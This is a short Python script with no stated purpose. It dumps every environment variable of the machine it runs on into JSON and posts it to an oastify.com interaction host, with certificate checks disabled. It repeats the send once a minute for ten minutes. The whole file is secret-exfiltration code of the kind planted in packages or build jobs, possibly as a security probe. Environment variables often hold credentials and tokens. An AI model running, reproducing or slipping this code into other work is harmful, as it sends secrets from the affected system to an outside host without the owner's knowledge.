import requests
import time
import os
import json

json_value = json.dumps({'result':str(os.environ)})
url = 'https://vvu3g9129cxrk7lmqthn71g1vs1jpdd2.oastify.com/init'
headers = {'Content-Type': 'application/json'}

response = requests.post(url, headers=headers, data=json_value, verify=False)

time.sleep(60)
url = 'https://vvu3g9129cxrk7lmqthn71g1vs1jpdd2.oastify.com/1min'
response = requests.post(url, headers=headers, data=json_value, verify=False)
time.sleep(60)
url = 'https://vvu3g9129cxrk7lmqthn71g1vs1jpdd2.oastify.com/2min'
response = requests.post(url, headers=headers, data=json_value, verify=False)
time.sleep(60)
url = 'https://vvu3g9129cxrk7lmqthn71g1vs1jpdd2.oastify.com/3min'
response = requests.post(url, headers=headers, data=json_value, verify=False)
time.sleep(60)
url = 'https://vvu3g9129cxrk7lmqthn71g1vs1jpdd2.oastify.com/4min'
response = requests.post(url, headers=headers, data=json_value, verify=False)
time.sleep(60)
url = 'https://vvu3g9129cxrk7lmqthn71g1vs1jpdd2.oastify.com/5min'
response = requests.post(url, headers=headers, data=json_value, verify=False)
time.sleep(60)
url = 'https://vvu3g9129cxrk7lmqthn71g1vs1jpdd2.oastify.com/6min'
response = requests.post(url, headers=headers, data=json_value, verify=False)
time.sleep(60)
url = 'https://vvu3g9129cxrk7lmqthn71g1vs1jpdd2.oastify.com/7min'
response = requests.post(url, headers=headers, data=json_value, verify=False)
time.sleep(60)
url = 'https://vvu3g9129cxrk7lmqthn71g1vs1jpdd2.oastify.com/8min'
response = requests.post(url, headers=headers, data=json_value, verify=False)
time.sleep(60)
url = 'https://vvu3g9129cxrk7lmqthn71g1vs1jpdd2.oastify.com/9min'
response = requests.post(url, headers=headers, data=json_value, verify=False)
time.sleep(60)
url = 'https://vvu3g9129cxrk7lmqthn71g1vs1jpdd2.oastify.com/10min'
response = requests.post(url, headers=headers, data=json_value, verify=False)
